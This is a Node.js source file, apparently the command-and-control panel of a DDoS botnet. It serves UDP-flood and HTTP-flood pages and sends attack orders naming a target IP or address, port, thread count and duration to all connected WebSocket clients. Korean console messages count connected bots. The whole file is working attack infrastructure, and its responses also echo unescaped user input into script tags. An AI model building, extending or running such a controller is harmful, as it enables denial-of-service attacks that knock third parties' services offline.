const WebSocket = require('ws');
const express = require("express");
const app = express();

app.use(express.static(__dirname+'/view'));
app.use(express.urlencoded({ extended: false}));


const wsServer = new WebSocket.Server({
    port: 8080
});
let count = 1;

app.get("/UDP",(req,res) => {
    res.sendFile(__dirname + "/view/UDP_flood.html")
})

app.get("/http",(req,res) => {
    res.sendFile(__dirname + "/view/HTTP_flood.html")
})


app.post("/udpattack",(req,res) => { 
    // ip port time thread
    let ip = req.body.ip;
    let port = req.body.port;
    let time = req.body.time;
    let thread = req.body.thread;
    console.log("UDP"+" "+ip+" "+port+" "+thread+" "+time)
    wsServer.clients.forEach((client)=>{ //UDP IP PORT THREAD Time MSG
        client.send("UDP"+" "+ip+" "+port+" "+thread+" "+time);
    })
    res.send(`<script>alert("Start UDPFlood for ${time} seconds with ${ip}");history.back(); </script>`)
})

app.post("/httpattack",(req,res) => { 
    // ip port time thread
    let adress = req.body.adress;
    let thread = req.body.thread;
    let time = req.body.time;
    console.log("HTTP"+" "+adress+" "+thread+" "+time)
    wsServer.clients.forEach((client)=>{ 
        client.send("HTTP"+" "+adress+" "+thread+" "+time);
    })
    res.send(`<script>alert("Start HTTPFlood for ${time} seconds with ${adress}");history.back();</script>`)
})

wsServer.on('connection', async function (socket) {
    console.log(`접속자 ${count++} 명`);
    socket.on('message', function (msg) {
        console.log("받은메세지"+msg)
    });
});

app.listen(3000,()=>{
    console.log(`Sever Open \n\n`); 
})